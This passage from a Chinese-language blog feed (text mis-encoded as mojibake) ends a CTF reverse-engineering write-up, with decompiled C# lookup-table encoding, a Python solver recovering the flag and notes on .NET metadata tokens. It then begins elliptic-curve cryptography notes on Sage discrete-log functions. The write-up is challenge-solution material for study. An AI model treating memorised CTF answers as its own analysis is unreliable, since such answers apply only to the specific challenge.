$ArrayType$$$BY0EF@_W + <span class="number">98</span>) = <span class="number">120</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@_W + <span class="number">100</span>) = <span class="number">121</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@_W + <span class="number">102</span>) = <span class="number">122</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@_W + <span class="number">104</span>) = <span class="number">48</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@_W + <span class="number">106</span>) = <span class="number">49</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@_W + <span class="number">108</span>) = <span class="number">50</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@_W + <span class="number">110</span>) = <span class="number">51</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@_W + <span class="number">112</span>) = <span class="number">52</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@_W + <span class="number">114</span>) = <span class="number">53</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@_W + <span class="number">116</span>) = <span class="number">54</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@_W + <span class="number">118</span>) = <span class="number">55</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@_W + <span class="number">120</span>) = <span class="number">56</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@_W + <span class="number">122</span>) = <span class="number">57</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@_W + <span class="number">124</span>) = <span class="number">92</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@_W + <span class="number">126</span>) = <span class="number">47</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@_W + <span class="number">128</span>) = <span class="number">43</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@_W + <span class="number">130</span>) = <span class="number">45</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@_W + <span class="number">132</span>) = <span class="number">95</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@_W + <span class="number">134</span>) = <span class="number">123</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@_W + <span class="number">136</span>) = <span class="number">125</span>;</span><br><span class="line">        <span class="built_in">char</span>* ptr = input;</span><br><span class="line">        <span class="keyword">if</span> (*input != <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">do</span></span><br><span class="line">            &#123;</span><br><span class="line">                ptr++;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">while</span> (*(<span class="built_in">short</span>*)ptr != <span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">int</span> num = ptr - input / <span class="number">2</span> &gt;&gt; <span class="number">1</span>;</span><br><span class="line">        <span class="built_in">string</span> text = <span class="literal">null</span>;</span><br><span class="line">        <span class="built_in">int</span> num2 = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="number">0</span> &lt; num)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">for</span> (;;)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">int</span> num3 = <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">for</span> (;;)</span><br><span class="line">                &#123;</span><br><span class="line">                    $ArrayType$$$BY0EF@_W* ptr2 = &amp;$ArrayType$$$BY0EF@_W;</span><br><span class="line">                    <span class="keyword">do</span></span><br><span class="line">                    &#123;</span><br><span class="line">                        ptr2 += <span class="number">2</span> / <span class="keyword">sizeof</span>($ArrayType$$$BY0EF@_W);</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">while</span> (*(<span class="built_in">short</span>*)ptr2 != <span class="number">0</span>);</span><br><span class="line">                    <span class="keyword">if</span> (num3 &gt;= ptr2 - <span class="keyword">ref</span> $ArrayType$$$BY0EF@_W / <span class="keyword">sizeof</span>($ArrayType$$$BY0EF@_W) &gt;&gt; <span class="number">1</span>)</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="keyword">goto</span> IL_52F;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">if</span> (*(num2 * <span class="number">2</span> + input) == *(num3 * <span class="number">2</span> + <span class="keyword">ref</span> $ArrayType$$$BY0EF@_W))</span><br><span class="line">                    <span class="comment">// æ‰¾ç´¢å¼•    input[num2] == W[num3]</span></span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="keyword">goto</span> IL_510;</span><br><span class="line">                    &#125;</span><br><span class="line">                    num3++;</span><br><span class="line">                &#125;</span><br><span class="line">                IL_53B:</span><br><span class="line">                num2++;</span><br><span class="line">                <span class="keyword">if</span> (num2 &gt;= num)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">                IL_510:</span><br><span class="line">                <span class="keyword">if</span> (num3 != <span class="number">-1</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                    text += (<span class="built_in">char</span>)(*(*(num3 * <span class="number">4</span> + <span class="keyword">ref</span> $ArrayType$$$BY0EF@H) * <span class="number">2</span> + <span class="keyword">ref</span> $ArrayType$$$BY0EF@_W));</span><br><span class="line">                    <span class="comment">// text += W[ 2*H[num3] ]</span></span><br><span class="line">                    <span class="keyword">goto</span> IL_53B;</span><br><span class="line">                &#125;</span><br><span class="line">                IL_52F:</span><br><span class="line">                text += <span class="string">&quot;=&quot;</span>;   <span class="comment">// base64???</span></span><br><span class="line">                <span class="keyword">goto</span> IL_53B;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        Console.WriteLine(text);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œå¤§è‡´åˆ†æä¸‹å°±çŸ¥é“æ˜¯ä¸¤æ¬¡ç´¢å¼•å˜æ¢ é€†å›å»å³å¯</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">s = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">$ArrayType$$$BY0EF@_W $ArrayType$$$BY0EF@_W = 65;</span></span><br><span class="line"><span class="string">        *(ref $ArrayType$$$BY0EF@_W + 2) = 66;</span></span><br><span class="line"><span class="string">        *(ref $ArrayType$$$BY0EF@_W + 4) = 67;</span></span><br><span class="line"><span class="string">        *(ref $ArrayType$$$BY0EF@_W + 6) = 68;</span></span><br><span class="line"><span class="string">        *(ref $ArrayType$$$BY0EF@_W + 8) = 69;</span></span><br><span class="line"><span class="string">        *(ref $ArrayType$$$BY0EF@_W + 10) = 70;</span></span><br><span class="line"><span class="string">        *(ref $ArrayType$$$BY0EF@_W + 12) = 71;</span></span><br><span class="line"><span class="string">        *(ref $ArrayType$$$BY0EF@_W + 14) = 72;</span></span><br><span class="line"><span class="string">        *(ref $ArrayType$$$BY0EF@_W + 16) = 73;</span></span><br><span class="line"><span class="string">        *(ref $ArrayType$$$BY0EF@_W + 18) = 74;</span></span><br><span class="line"><span class="string">        *(ref $ArrayType$$$BY0EF@_W + 20) = 75;</span></span><br><span class="line"><span class="string">        *(ref $ArrayType$$$BY0EF@_W + 22) = 76;</span></span><br><span class="line"><span class="string">        *(ref $ArrayType$$$BY0EF@_W + 24) = 77;</span></span><br><span class="line"><span class="string">        *(ref $ArrayType$$$BY0EF@_W + 26) = 78;</span></span><br><span class="line"><span class="string">        *(ref $ArrayType$$$BY0EF@_W + 28) = 79;</span></span><br><span class="line"><span class="string">        *(ref $ArrayType$$$BY0EF@_W + 30) = 80;</span></span><br><span class="line"><span class="string">        *(ref $ArrayType$$$BY0EF@_W + 32) = 81;</span></span><br><span class="line"><span class="string">        *(ref $ArrayType$$$BY0EF@_W + 34) = 82;</span></span><br><span class="line"><span class="string">        *(ref $ArrayType$$$BY0EF@_W + 36) = 83;</span></span><br><span class="line"><span class="string">        *(ref $ArrayType$$$BY0EF@_W + 38) = 84;</span></span><br><span class="line"><span class="string">        *(ref $ArrayType$$$BY0EF@_W + 40) = 85;</span></span><br><span class="line"><span class="string">        *(ref $ArrayType$$$BY0EF@_W + 42) = 86;</span></span><br><span class="line"><span class="string">        *(ref $ArrayType$$$BY0EF@_W + 44) = 87;</span></span><br><span class="line"><span class="string">        *(ref $ArrayType$$$BY0EF@_W + 46) = 88;</span></span><br><span class="line"><span class="string">        *(ref $ArrayType$$$BY0EF@_W + 48) = 89;</span></span><br><span class="line"><span class="string">        *(ref $ArrayType$$$BY0EF@_W + 50) = 90;</span></span><br><span class="line"><span class="string">        *(ref $ArrayType$$$BY0EF@_W + 52) = 97;</span></span><br><span class="line"><span class="string">        *(ref $ArrayType$$$BY0EF@_W + 54) = 98;</span></span><br><span class="line"><span class="string">        *(ref $ArrayType$$$BY0EF@_W + 56) = 99;</span></span><br><span class="line"><span class="string">        *(ref $ArrayType$$$BY0EF@_W + 58) = 100;</span></span><br><span class="line"><span class="string">        *(ref $ArrayType$$$BY0EF@_W + 60) = 101;</span></span><br><span class="line"><span class="string">        *(ref $ArrayType$$$BY0EF@_W + 62) = 102;</span></span><br><span class="line"><span class="string">        *(ref $ArrayType$$$BY0EF@_W + 64) = 103;</span></span><br><span class="line"><span class="string">        *(ref $ArrayType$$$BY0EF@_W + 66) = 104;</span></span><br><span class="line"><span class="string">        *(ref $ArrayType$$$BY0EF@_W + 68) = 105;</span></span><br><span class="line"><span class="string">        *(ref $ArrayType$$$BY0EF@_W + 70) = 106;</span></span><br><span class="line"><span class="string">        *(ref $ArrayType$$$BY0EF@_W + 72) = 107;</span></span><br><span class="line"><span class="string">        *(ref $ArrayType$$$BY0EF@_W + 74) = 108;</span></span><br><span class="line"><span class="string">        *(ref $ArrayType$$$BY0EF@_W + 76) = 109;</span></span><br><span class="line"><span class="string">        *(ref $ArrayType$$$BY0EF@_W + 78) = 110;</span></span><br><span class="line"><span class="string">        *(ref $ArrayType$$$BY0EF@_W + 80) = 111;</span></span><br><span class="line"><span class="string">        *(ref $ArrayType$$$BY0EF@_W + 82) = 112;</span></span><br><span class="line"><span class="string">        *(ref $ArrayType$$$BY0EF@_W + 84) = 113;</span></span><br><span class="line"><span class="string">        *(ref $ArrayType$$$BY0EF@_W + 86) = 114;</span></span><br><span class="line"><span class="string">        *(ref $ArrayType$$$BY0EF@_W + 88) = 115;</span></span><br><span class="line"><span class="string">        *(ref $ArrayType$$$BY0EF@_W + 90) = 116;</span></span><br><span class="line"><span class="string">        *(ref $ArrayType$$$BY0EF@_W + 92) = 117;</span></span><br><span class="line"><span class="string">        *(ref $ArrayType$$$BY0EF@_W + 94) = 118;</span></span><br><span class="line"><span class="string">        *(ref $ArrayType$$$BY0EF@_W + 96) = 119;</span></span><br><span class="line"><span class="string">        *(ref $ArrayType$$$BY0EF@_W + 98) = 120;</span></span><br><span class="line"><span class="string">        *(ref $ArrayType$$$BY0EF@_W + 100) = 121;</span></span><br><span class="line"><span class="string">        *(ref $ArrayType$$$BY0EF@_W + 102) = 122;</span></span><br><span class="line"><span class="string">        *(ref $ArrayType$$$BY0EF@_W + 104) = 48;</span></span><br><span class="line"><span class="string">        *(ref $ArrayType$$$BY0EF@_W + 106) = 49;</span></span><br><span class="line"><span class="string">        *(ref $ArrayType$$$BY0EF@_W + 108) = 50;</span></span><br><span class="line"><span class="string">        *(ref $ArrayType$$$BY0EF@_W + 110) = 51;</span></span><br><span class="line"><span class="string">        *(ref $ArrayType$$$BY0EF@_W + 112) = 52;</span></span><br><span class="line"><span class="string">        *(ref $ArrayType$$$BY0EF@_W + 114) = 53;</span></span><br><span class="line"><span class="string">        *(ref $ArrayType$$$BY0EF@_W + 116) = 54;</span></span><br><span class="line"><span class="string">        *(ref $ArrayType$$$BY0EF@_W + 118) = 55;</span></span><br><span class="line"><span class="string">        *(ref $ArrayType$$$BY0EF@_W + 120) = 56;</span></span><br><span class="line"><span class="string">        *(ref $ArrayType$$$BY0EF@_W + 122) = 57;</span></span><br><span class="line"><span class="string">        *(ref $ArrayType$$$BY0EF@_W + 124) = 92;</span></span><br><span class="line"><span class="string">        *(ref $ArrayType$$$BY0EF@_W + 126) = 47;</span></span><br><span class="line"><span class="string">        *(ref $ArrayType$$$BY0EF@_W + 128) = 43;</span></span><br><span class="line"><span class="string">        *(ref $ArrayType$$$BY0EF@_W + 130) = 45;</span></span><br><span class="line"><span class="string">        *(ref $ArrayType$$$BY0EF@_W + 132) = 95;</span></span><br><span class="line"><span class="string">        *(ref $ArrayType$$$BY0EF@_W + 134) = 123;</span></span><br><span class="line"><span class="string">        *(ref $ArrayType$$$BY0EF@_W + 136) = 125;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">s = s.split(<span class="string">&quot;;&quot;</span>)</span><br><span class="line">s = s[:-<span class="number">1</span>]</span><br><span class="line">W = []</span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> s:</span><br><span class="line">    c = c.split(<span class="string">&#x27;=&#x27;</span>)</span><br><span class="line">    W.append(c[<span class="number">1</span>].strip())</span><br><span class="line"></span><br><span class="line">s = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">$ArrayType$$$BY0EF@H $ArrayType$$$BY0EF@H = 45;</span></span><br><span class="line"><span class="string">        *(ref $ArrayType$$$BY0EF@H + 4) = 15;</span></span><br><span class="line"><span class="string">        *(ref $ArrayType$$$BY0EF@H + 8) = 67;</span></span><br><span class="line"><span class="string">        *(ref $ArrayType$$$BY0EF@H + 12) = 61;</span></span><br><span class="line"><span class="string">        *(ref $ArrayType$$$BY0EF@H + 16) = 8;</span></span><br><span class="line"><span class="string">        *(ref $ArrayType$$$BY0EF@H + 20) = 68;</span></span><br><span class="line"><span class="string">        *(ref $ArrayType$$$BY0EF@H + 24) = 9;</span></span><br><span class="line"><span class="string">        *(ref $ArrayType$$$BY0EF@H + 28) = 39;</span></span><br><span class="line"><span class="string">        *(ref $ArrayType$$$BY0EF@H + 32) = 60;</span></span><br><span class="line"><span class="string">        *(ref $ArrayType$$$BY0EF@H + 36) = 2;</span></span><br><span class="line"><span class="string">        *(ref $ArrayType$$$BY0EF@H + 40) = 56;</span></span><br><span class="line"><span class="string">        *(ref $ArrayType$$$BY0EF@H + 44) = 63;</span></span><br><span class="line"><span class="string">        *(ref $ArrayType$$$BY0EF@H + 48) = 36;</span></span><br><span class="line"><span class="string">        *(ref $ArrayType$$$BY0EF@H + 52) = 38;</span></span><br><span class="line"><span class="string">        *(ref $ArrayType$$$BY0EF@H + 56) = 28;</span></span><br><span class="line"><span class="string">        *(ref $ArrayType$$$BY0EF@H + 60) = 29;</span></span><br><span class="line"><span class="string">        *(ref $ArrayType$$$BY0EF@H + 64) = 57;</span></span><br><span class="line"><span class="string">        *(ref $ArrayType$$$BY0EF@H + 68) = 50;</span></span><br><span class="line"><span class="string">        *(ref $ArrayType$$$BY0EF@H + 72) = 1;</span></span><br><span class="line"><span class="string">        *(ref $ArrayType$$$BY0EF@H + 76) = 0;</span></span><br><span class="line"><span class="string">        *(ref $ArrayType$$$BY0EF@H + 80) = 51;</span></span><br><span class="line"><span class="string">        *(ref $ArrayType$$$BY0EF@H + 84) = 52;</span></span><br><span class="line"><span class="string">        *(ref $ArrayType$$$BY0EF@H + 88) = 17;</span></span><br><span class="line"><span class="string">        *(ref $ArrayType$$$BY0EF@H + 92) = 3;</span></span><br><span class="line"><span class="string">        *(ref $ArrayType$$$BY0EF@H + 96) = 26;</span></span><br><span class="line"><span class="string">        *(ref $ArrayType$$$BY0EF@H + 100) = 21;</span></span><br><span class="line"><span class="string">        *(ref $ArrayType$$$BY0EF@H + 104) = 40;</span></span><br><span class="line"><span class="string">        *(ref $ArrayType$$$BY0EF@H + 108) = 11;</span></span><br><span class="line"><span class="string">        *(ref $ArrayType$$$BY0EF@H + 112) = 37;</span></span><br><span class="line"><span class="string">        *(ref $ArrayType$$$BY0EF@H + 116) = 16;</span></span><br><span class="line"><span class="string">        *(ref $ArrayType$$$BY0EF@H + 120) = 31;</span></span><br><span class="line"><span class="string">        *(ref $ArrayType$$$BY0EF@H + 124) = 22;</span></span><br><span class="line"><span class="string">        *(ref $ArrayType$$$BY0EF@H + 128) = 32;</span></span><br><span class="line"><span class="string">        *(ref $ArrayType$$$BY0EF@H + 132) = 19;</span></span><br><span class="line"><span class="string">        *(ref $ArrayType$$$BY0EF@H + 136) = 33;</span></span><br><span class="line"><span class="string">        *(ref $ArrayType$$$BY0EF@H + 140) = 4;</span></span><br><span class="line"><span class="string">        *(ref $ArrayType$$$BY0EF@H + 144) = 66;</span></span><br><span class="line"><span class="string">        *(ref $ArrayType$$$BY0EF@H + 148) = 53;</span></span><br><span class="line"><span class="string">        *(ref $ArrayType$$$BY0EF@H + 152) = 65;</span></span><br><span class="line"><span class="string">        *(ref $ArrayType$$$BY0EF@H + 156) = 25;</span></span><br><span class="line"><span class="string">        *(ref $ArrayType$$$BY0EF@H + 160) = 41;</span></span><br><span class="line"><span class="string">        *(ref $ArrayType$$$BY0EF@H + 164) = 44;</span></span><br><span class="line"><span class="string">        *(ref $ArrayType$$$BY0EF@H + 168) = 20;</span></span><br><span class="line"><span class="string">        *(ref $ArrayType$$$BY0EF@H + 172) = 7;</span></span><br><span class="line"><span class="string">        *(ref $ArrayType$$$BY0EF@H + 176) = 12;</span></span><br><span class="line"><span class="string">        *(ref $ArrayType$$$BY0EF@H + 180) = 18;</span></span><br><span class="line"><span class="string">        *(ref $ArrayType$$$BY0EF@H + 184) = 64;</span></span><br><span class="line"><span class="string">        *(ref $ArrayType$$$BY0EF@H + 188) = 30;</span></span><br><span class="line"><span class="string">        *(ref $ArrayType$$$BY0EF@H + 192) = 49;</span></span><br><span class="line"><span class="string">        *(ref $ArrayType$$$BY0EF@H + 196) = 58;</span></span><br><span class="line"><span class="string">        *(ref $ArrayType$$$BY0EF@H + 200) = 10;</span></span><br><span class="line"><span class="string">        *(ref $ArrayType$$$BY0EF@H + 204) = 62;</span></span><br><span class="line"><span class="string">        *(ref $ArrayType$$$BY0EF@H + 208) = 24;</span></span><br><span class="line"><span class="string">        *(ref $ArrayType$$$BY0EF@H + 212) = 43;</span></span><br><span class="line"><span class="string">        *(ref $ArrayType$$$BY0EF@H + 216) = 48;</span></span><br><span class="line"><span class="string">        *(ref $ArrayType$$$BY0EF@H + 220) = 46;</span></span><br><span class="line"><span class="string">        *(ref $ArrayType$$$BY0EF@H + 224) = 6;</span></span><br><span class="line"><span class="string">        *(ref $ArrayType$$$BY0EF@H + 228) = 47;</span></span><br><span class="line"><span class="string">        *(ref $ArrayType$$$BY0EF@H + 232) = 13;</span></span><br><span class="line"><span class="string">        *(ref $ArrayType$$$BY0EF@H + 236) = 35;</span></span><br><span class="line"><span class="string">        *(ref $ArrayType$$$BY0EF@H + 240) = 42;</span></span><br><span class="line"><span class="string">        *(ref $ArrayType$$$BY0EF@H + 244) = 14;</span></span><br><span class="line"><span class="string">        *(ref $ArrayType$$$BY0EF@H + 248) = 59;</span></span><br><span class="line"><span class="string">        *(ref $ArrayType$$$BY0EF@H + 252) = 23;</span></span><br><span class="line"><span class="string">        *(ref $ArrayType$$$BY0EF@H + 256) = 27;</span></span><br><span class="line"><span class="string">        *(ref $ArrayType$$$BY0EF@H + 260) = 34;</span></span><br><span class="line"><span class="string">        *(ref $ArrayType$$$BY0EF@H + 264) = 54;</span></span><br><span class="line"><span class="string">        *(ref $ArrayType$$$BY0EF@H + 268) = 55;</span></span><br><span class="line"><span class="string">        *(ref $ArrayType$$$BY0EF@H + 272) = 5;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">s = s.split(<span class="string">&quot;;&quot;</span>)</span><br><span class="line">s = s[:-<span class="number">1</span>]</span><br><span class="line">H = []</span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> s:</span><br><span class="line">    c = c.split(<span class="string">&#x27;=&#x27;</span>)</span><br><span class="line">    H.append(c[<span class="number">1</span>].strip())</span><br><span class="line">W = [<span class="built_in">int</span>(x) <span class="keyword">for</span> x <span class="keyword">in</span> W]</span><br><span class="line">H = [<span class="built_in">int</span>(x) <span class="keyword">for</span> x <span class="keyword">in</span> H]</span><br><span class="line"></span><br><span class="line">enc = <span class="string">&quot;W1og39p2Kp+2_Zpx2&#123;/yF&quot;</span></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(enc)):</span><br><span class="line">    x = <span class="built_in">ord</span>(enc[i])</span><br><span class="line">    pos = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">69</span>):</span><br><span class="line">        <span class="keyword">if</span> W[j]==x:</span><br><span class="line">            pos = j</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    poss = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">69</span>):</span><br><span class="line">        <span class="keyword">if</span>(H[j]==pos):</span><br><span class="line">            poss = j</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(W[poss]),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="comment"># flag&#123;Do_you_know_CLR&#125;</span></span><br></pre></td></tr></table></figure>

<p>çœ‹åˆ°flagä¸­çš„CLR å»å­¦ä¹ äº†ä¸€æ³¢<br>CLR: å…¬å…±è¯­è¨€è¿è¡Œåº“</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">å…¬å…±è¯­è¨€è¿è¡Œåº“ (CLR) æ˜¯ .NET Framework çš„æ ¸å¿ƒï¼Œä¸ºæ‰€æœ‰ .NET Framework ä»£ç æä¾›æ‰§è¡Œç¯å¢ƒã€‚ åœ¨ CLR ä¸­è¿è¡Œçš„ä»£ç ç§°ä¸ºæ‰˜ç®¡ä»£ç ã€‚ </span><br><span class="line">CLR æä¾›æ‰§è¡Œç¨‹åºæ‰€éœ€çš„å„ç§å‡½æ•°å’ŒæœåŠ¡ï¼ŒåŒ…æ‹¬å®æ—¶ (JIT) ç¼–è¯‘ã€åˆ†é…å’Œç®¡ç†å†…å­˜ã€å¼ºåˆ¶ç±»å‹å®‰å…¨ã€å¼‚å¸¸å¤„ç†ã€çº¿ç¨‹ç®¡ç†å’Œå®‰å…¨æ€§ã€‚</span><br></pre></td></tr></table></figure>

<p>è¿™â€¦ çœ‹äº†çœ‹å®˜æ–¹é¢˜è§£ è¯´çš„æ˜¯è¿™é‡Œçš„exeæ˜¯ä¸€ä¸ªå¸¦æœ‰.netç¯å¢ƒçš„exeï¼Œä¹Ÿå°±æ˜¯è¿è¡Œåœ¨CLRç¯å¢ƒä¸‹çš„ä»£ç <br>ç„¶åé¢˜è§£è¯´ä»IDAæ‰“å¼€å¯ä»¥å®šä½åˆ°å¯ä»¥å‡½æ•°çš„token: 6000008h å¹¶ä¸æ˜¯ä¸€ä¸ªçœŸæ­£çš„åœ°å€ï¼Œè€Œæ˜¯C#ä¸­çš„å‡½æ•°metatokenï¼Œæ˜¯C#ç”¨äºå®šä½å‡½æ•°é›†ä¸­æ¯ä¸ªå‡½æ•°çš„ä¸€ä¸ªç‹¬ä¸€æ— äºŒçš„æ ‡è¯†ç¬¦<br>æ‰€ä»¥å†ç”¨dnspyæ‰“å¼€æ—¶å°±å¯ä»¥ç”¨tokenæ¥å¿«é€Ÿå®šä½äº† ç¡®å®æ‰“å¼€&lt; Module &gt;ä¸‹èƒ½æ‰¾åˆ°ä¸€ç³»åˆ—å¸¦æœ‰tokençš„å‡½æ•° å­¦åˆ°äº†</p>
]]></content>
      <categories>
        <category>CTF-Reverse</category>
      </categories>
  </entry>
  <entry>
    <title>Crypto-ECC</title>
    <url>/2023/12/08/Crypto-ECC/</url>
    <content><![CDATA[<p>å­¦ä¹ ECCçŸ¥è¯†ç‚¹ä»¥åŠç›¸å…³é¢˜ç›®</p>
<span id="more"></span>
<p>ä»¥å‰æ–­æ–­ç»­ç»­çœ‹è¿‡ECC å­¦çš„å¾ˆä¸æ‰å® ä¸€äº›ç®—æ³•ä¹Ÿæ²¡ç†è§£åŸç† ç°åœ¨æœ‰ä¸€å®šç¾¤è®ºåŸºç¡€åå†æ¥å­¦ä¸€é</p>
<h1 id="ç›¸å…³çŸ¥è¯†ç‚¹-å®šä¹‰"><a href="#ç›¸å…³çŸ¥è¯†ç‚¹-å®šä¹‰" class="headerlink" title="ç›¸å…³çŸ¥è¯†ç‚¹&#x2F;å®šä¹‰"></a>ç›¸å…³çŸ¥è¯†ç‚¹&#x2F;å®šä¹‰</h1><p>å…¶å®<a href="https://ohmygodlin.github.io/ctf/crypto/2020/12/28/%E6%A4%AD%E5%9C%86%E6%9B%B2%E7%BA%BF%E5%AF%86%E7%A0%81ECC%E5%B8%B8%E8%A7%81%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95/" target="_blank">è¿™ç¯‡</a>è®²çš„æŒºå¥½çš„</p>
<h2 id="æ¤­åœ†æ›²çº¿"><a href="#æ¤­åœ†æ›²çº¿" class="headerlink" title="æ¤­åœ†æ›²çº¿"></a>æ¤­åœ†æ›²çº¿</h2><p>ECCé‡Œé¢åªè€ƒè™‘ <code>Ep : y^2 === x^3 + a*x + b mod p</code> å½¢å¼</p>
<ul>
<li>Î” &#x3D; -16(4*a^3+27b)â‰ 0 ä¿è¯æ›²çº¿å…‰æ»‘</li>
<li>a,b âˆˆ K Kä¸ºEçš„åŸºç¡€åŸŸ</li>
<li>ç‚¹Oâˆæ˜¯æ›²çº¿çš„å”¯ä¸€æ— ç©·è¿œç‚¹</li>
</ul>
<h2 id="æ¤­åœ†æ›²çº¿ä¸Šçš„åŠ æ³•"><a href="#æ¤­åœ†æ›²çº¿ä¸Šçš„åŠ æ³•" class="headerlink" title="æ¤­åœ†æ›²çº¿ä¸Šçš„åŠ æ³•"></a>æ¤­åœ†æ›²çº¿ä¸Šçš„åŠ æ³•</h2><p>å€Ÿä½¬å›¾ï¼š<br><img src="https://s2.loli.net/2023/12/08/gTdyjkJezQV8IhM.png" alt="img"></p>
<p>è¦ç†Ÿç»ƒæŒæ¡å…¬å¼ å¥½å¤šé¢˜ç›®éƒ½å¯ä»¥ç”¨åŠ æ³•å…¬å¼è½¬æˆä»£æ•°æ–¹ç¨‹æ¥è§£</p>
<h2 id="What-is-ECC"><a href="#What-is-ECC" class="headerlink" title="What is ECC?"></a>What is ECC?</h2><p><img src="https://s2.loli.net/2023/12/08/miK8AzOIstlZ3xa.png" alt="img"></p>
<h2 id="Sageç›¸å…³å‡½æ•°å®ç°"><a href="#Sageç›¸å…³å‡½æ•°å®ç°" class="headerlink" title="Sageç›¸å…³å‡½æ•°å®ç°"></a>Sageç›¸å…³å‡½æ•°å®ç°</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">E = EllipticCurve(GF(p),[a,b]) <span class="comment"># y^2 === x^3 + a*x + b mod p</span></span><br><span class="line"></span><br><span class="line">E.random_point() <span class="comment"># åœ¨æ¤­åœ†æ›²çº¿Eä¸Šéšæœºé€‰ä¸€ç‚¹</span></span><br><span class="line"></span><br><span class="line">E.set_order() <span class="comment"># è®¾ç½®æ¤­åœ†æ›²çº¿çš„é˜¶</span></span><br><span class="line"></span><br><span class="line">E.point((x,y)) <span class="comment"># åˆ›å»ºä¸€ä¸ªæ›²çº¿ä¸Šçš„ç‚¹å¯¹è±¡</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># æ±‚è§£ç§é’¥ k K = k*G</span></span><br><span class="line"><span class="comment"># è‡ªåŠ¨é€‰æ‹© BSGS æˆ–è€… Pohlig-Hellmanç®—æ³•</span></span><br><span class="line">discrete_log(K,G,operation=<span class="string">&#x27;+&#x27;</span>)</span><br><span class="line"><span class="comment"># ç­‰ä»·äº</span></span><br><span class="line">G.discrete_log(K)</span><br><span class="line"></span><br><span class="line">E.order() <span class="comment"># è®¡ç®—æ¤­åœ†æ›²çº¿ä¸Šç‚¹çš„é˜¶</span></span><br><span class="line"><span class="built_in">print</span>(factor(E.order()))</span><br><span class="line"><span class="comment"># 2 * 3^3 * 5 * 7 * 212117 * 302426983 * 10362951863095936421891634612647340060175499</span></span><br><span class="line"><span class="built_in">print</span>(*factor(E.order()))</span><br><span class="line"><span class="comment">#(2, 1) (3, 3) (5, 1) (7, 1) (212117, 1) (302426983, 1) (10362951863095936421891634612647340060175499, 1)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ç”¨Pollard rhoç®—æ³•æ±‚è§£ç§é’¥</span></span><br><span class="line">discrete_log_rho(K,G,operation=<span class="string">&#x27;+&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ç”¨Pollard Lambdaç®—æ³•æ±‚è§£ç§é’¥ï¼Œèƒ½å¤Ÿç¡®å®šæ‰€æ±‚å€¼åœ¨æŸä¸€å°èŒƒå›´æ—¶æ•ˆç‡è¾ƒé«˜</span></span><br><span class="line">discrete_log_lambda(K,G,bound,operation=<span class="string">&#x27;+&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

